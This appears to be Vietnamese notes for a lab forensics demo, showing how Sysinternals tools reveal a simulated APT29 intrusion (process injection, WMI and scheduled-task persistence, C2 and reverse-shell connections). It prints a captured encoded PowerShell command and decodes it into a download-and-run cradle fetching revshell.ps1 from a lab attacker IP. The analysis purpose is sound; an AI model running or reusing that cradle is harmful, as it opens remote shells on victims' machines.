@@ -1,0 +1,63 @@
+C:\Tools\Forensic\
+├── collect_evidence_v2.2.ps1
+├── tools\
+│   ├── winpmem_mini_x64.exe
+│   ├── RawCopy64.exe
+│   ├── handle64.exe
+│   ├── Listdlls64.exe
+│   ├── autorunsc64.exe
+│   └── ExtractUsnJrnl.exe   (tùy chọn)
+└── evidence\                (script tự tạo khi chạy)
+
+
+1. Bộ Sysinternals (bắt buộc cho demo trực quan)
+Đây là bộ tool chuẩn công nghiệp, chạy portable, không cần cài đặt. Bạn chỉ cần tải về, giải nén, chạy trực tiếp.
+
+    Process Explorer — nhìn thấy injection vào notepad
+
+        Mục đích: xem cây tiến trình, module đã tải, handle. Với APT29, bạn sẽ thấy notepad.exe có thread lạ hoặc DLL không có path (ReflectivePick) sau khi orchestrator inject keylogger .
+
+        Cách dùng khi demo: mở Process Explorer với quyền Admin, bật View > Show Lower Pane và View > Lower Pane View > DLLs. Khi notepad bị inject, bạn sẽ thấy một DLL không có đường dẫn hợp lệ hoặc thread bắt đầu từ vùng nhớ không phải module.
+
+    TCPView — thấy notepad hoặc powershell kết nối ra ngoài
+
+        Mục đích: xem tất cả kết nối TCP/UDP kèm process sở hữu. Với APT29, bạn sẽ thấy powershell.exe kết nối TCP 8443 (C2), 4444 (revshell), hoặc 5555 (exfil) tới 192.168.56.100 .
+
+        Cách dùng: chạy TCPView, sort theo Process. Khi revshell hoạt động, dòng powershell.exe sẽ highlight xanh (established) tới IP attacker.
+
+    Autoruns — thấy WMI subscription và Scheduled Task xuất hiện live
+
+        Mục đích: liệt kê mọi cơ chế persistence. Với APT29, bạn sẽ thấy NotepadTrigger trong tab WMI, và APT29LoginTask / SysLogMaint trong tab Scheduled Tasks .
+
+        Cách dùng: chạy Autoruns với Admin, bật Options > Hide Microsoft Entries để giảm nhiễu. Sau khi chạy wmi_setup.ps1, refresh tab WMI — NotepadTrigger sẽ xuất hiện. Đây là khoảnh khắc demo rất mạnh.
+
+    Process Monitor (Procmon) — thấy registry và file thay đổi real-time
+
+        Mục đích: ghi lại mọi thao tác file/registry/process. Với APT29, bạn sẽ thấy stage2 ghi policy EnableScriptBlockLogging = 0, stage3 ghi APT29Stage1\Payload vào registry, hoặc orchestrator ghi .last_injected_pid .
+
+        Lưu ý: Procmon rất nhiễu. Khi demo, pause capture (Ctrl+E) ngay khi mở, dùng filter (Ctrl+L) để chỉ hiện các event liên quan đến powershell.exe, notepad.exe, wevtutil, reg.exe. Sau đó resume capture (Ctrl+E) và chạy lại bước tấn công muốn quan sát.
+
+TCPview 
+    -> powershell pid 5928
+Process Monitor
+    -> PID is 5928
+    -> Operation is TCP Send 
+    -> Operation is TCP Receive
+    -> Operation is TCP Connect
+
+    Mở Tools -> Process Tree -> Command 
+    -> Thấy PS1 khởi chạy thông qua WMI
+    -> Thấy có whoami và ipconfig (dấu vết thu thập thông tin hệ thốnh)
+    -> Xem phần command line có base64 ()
+
+    Sao chép base64 vào
+    powershell.exe (5928)	Windows PowerShell	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe	<graph>	Microsoft Corporation	NT AUTHORITY\SYSTEM	powershell.exe -NoP -W H -Exec Bypass -Enc WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAHIAdgBlAHIAQwBlAHIAdABpAGYAaQBjAGEAdABlAFYAYQBsAGkAZABhAHQAaQBvAG4AQwBhAGwAbABiAGEAYwBrAD0AewAkAHQAcgB1AGUAfQA7AFsATgBlAHQALgBTAGUAcgB2AGkAYwBlAFAAbwBpAG4AdABNAGEAbgBhAGcAZQByAF0AOgA6AFMAZQBjAHUAcgBpAHQAeQBQAHIAbwB0AG8AYwBvAGwAPQBbAE4AZQB0AC4AUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbABUAHkAcABlAF0AOgA6AFQAbABzADEAMgA7AFsATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEQAZQBmAGEAdQBsAHQAVwBlAGIAUAByAG8AeAB5AD0AJABuAHUAbABsADsAJAB3AGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdwBjAC4AUAByAG8AeAB5AD0AJABuAHUAbABsADsASQBFAFgAIAAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvADEAOQAyAC4AMQA2ADgALgA1ADYALgAxADAAMAA6ADgANAA0ADMALwByAGUAdgBzAGgAZQBsAGwALgBwAHMAMQAnACkA	11/3/2026 9:54:40.8138066 AM	n/a
+
+$encoded = 'WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAHIAdgBlAHIAQwBlAHIAdABpAGYAaQBjAGEAdABlAFYAYQBsAGkAZABhAHQAaQBvAG4AQwBhAGwAbABiAGEAYwBrAD0AewAkAHQAcgB1AGUAfQA7AFsATgBlAHQALgBTAGUAcgB2AGkAYwBlAFAAbwBpAG4AdABNAGEAbgBhAGcAZQByAF0AOgA6AFMAZQBjAHUAcgBpAHQAeQBQAHIAbwB0AG8AYwBvAGwAPQBbAE4AZQB0AC4AUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbABUAHkAcABlAF0AOgA6AFQAbABzADEAMgA7AFsATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEQAZQBmAGEAdQBsAHQAVwBlAGIAUAByAG8AeAB5AD0AJABuAHUAbABsADsAJAB3AGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdwBjAC4AUAByAG8AeAB5AD0AJABuAHUAbABsADsASQBFAFgAIAAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvADEAOQAyAC4AMQA2ADgALgA1ADYALgAxADAAMAA6ADgANAA0ADMALwByAGUAdgBzAGgAZQBsAGwALgBwAHMAMQAnACkA'
+[Text.Encoding]::Unicode.GetString(
+    [Convert]::FromBase64String($encoded)
+)
+
+=> Kết quả: 
+
+[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.WebRequest]::DefaultWebProxy=$null;$wc=New-Object Net.WebClient;$wc.Proxy=$null;IEX $wc.DownloadString('https://192.168.56.100:8443/revshell.ps1')
